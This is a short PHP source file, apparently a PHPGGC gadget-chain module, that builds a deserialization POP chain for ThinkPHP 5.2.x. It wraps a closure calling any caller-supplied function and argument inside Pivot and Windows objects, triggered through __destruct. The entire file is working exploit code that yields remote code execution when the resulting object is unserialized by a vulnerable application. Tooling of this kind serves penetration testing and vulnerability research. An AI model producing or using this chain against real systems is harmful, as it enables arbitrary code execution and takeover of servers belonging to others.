<?php
namespace GadgetChain\ThinkPHP;

class RCE2 extends \PHPGGC\GadgetChain\RCE
{
    public static $version = '=v5.2.x';
    public static $vector = '__destruct';
    public static $author = 'huha';

    public function generate(array $parameters)
    {
		//构造POP链条
		$function = $parameters['function'];
        $parameter = $parameters['parameter'];
		$func = function()use($function,$parameter){$function($parameter);};
		$closure = new \Opis\Closure\SerializableClosure($func);
		$pivot = new \think\model\Pivot($closure);
		$windows = new \think\process\pipes\Windows($pivot);
		//var_dump(new Windows(new Pivot()));
		return $windows;
    }
}